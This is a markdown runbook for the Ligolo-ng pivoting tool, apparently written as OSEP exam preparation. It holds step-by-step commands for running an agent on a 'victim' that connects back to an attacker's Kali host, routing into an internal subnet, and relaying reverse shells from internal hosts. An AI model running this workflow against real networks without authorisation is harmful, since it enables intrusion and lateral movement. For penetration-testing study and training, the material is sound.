# Ligolo-ng

See the parent `RUNBOOK.md` for full usage. Ligolo-ng is the **preferred** pivoting tool for OSEP — use it whenever you can drop a binary on the pivot.

## Why Ligolo-ng over Chisel

| | Chisel | Ligolo-ng |
|--|--------|-----------|
| How it works | SOCKS5 proxy | Real TUN interface |
| Requires proxychains | Yes | No |
| nmap UDP scans | No | Yes |
| Speed | Good | Better |
| Tool compatibility | Most tools | All tools |

With Ligolo-ng, internal hosts appear on your network. No proxychains wrapper needed.

## Setup (run once at exam start)

```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Verify
ip link show ligolo
```

## Binary locations

```
proxy         ← runs on Kali
agent.exe     ← drops on Windows victims
agent         ← drops on Linux victims
```

Download from: https://github.com/nicocha30/ligolo-ng/releases

## Full workflow — from zero to routed network

```bash
# Step 1: Kali
./proxy -selfcert -laddr 0.0.0.0:11601

# Step 2: Windows victim
agent.exe -connect KALI_IP:11601 -ignore-cert

# Step 3: Kali proxy console (after agent connects)
session       # list sessions
1             # select session 1
start         # start tunnel

# Step 4: Kali terminal (add route for internal subnet)
sudo ip route add 172.16.1.0/24 dev ligolo

# Done — reach internal hosts directly:
nmap -sV 172.16.1.100
```

## Listener (for reverse shells from internal hosts)

After agent connects and tunnel is started, in the proxy console:
```
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

Set payload `LHOST` = pivot's internal IP, `LPORT` = 4444.
Catch shell on Kali with your usual listener on :4444.
